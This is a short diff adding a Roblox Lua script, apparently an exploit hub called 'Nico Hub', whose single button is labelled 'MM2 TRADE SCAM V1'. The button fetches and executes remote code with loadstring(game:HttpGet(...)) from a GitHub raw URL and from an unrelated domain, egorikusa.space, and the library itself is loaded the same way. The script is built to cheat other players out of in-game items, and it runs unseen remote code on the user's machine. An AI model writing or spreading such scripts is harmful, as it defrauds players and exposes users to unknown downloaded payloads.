@@ -1,0 +1,14 @@
+local DrRayLibrary =
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/DrRay-UI-Library/main/DrRay.lua"))()
+local window = DrRayLibrary:Load("Nico Hub👽🟢", "Default")
+local tab = DrRayLibrary.newTab("Scripts", "rbxassetid://6768917255")
+
+tab.newButton(
+    "MM2 TRADE SCAM V1🔥✅",
+    "Status: 🟢 Around 25 seconds to load but it's alr ^^",
+    function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/BoiFreedom/BoiFreedom/refs/heads/main/UI%20TRADE"))()
+
+loadstring(game:HttpGet("https://egorikusa.space/c89b6880e2b292dc61362cb7.lua", true))()
+    end
+)
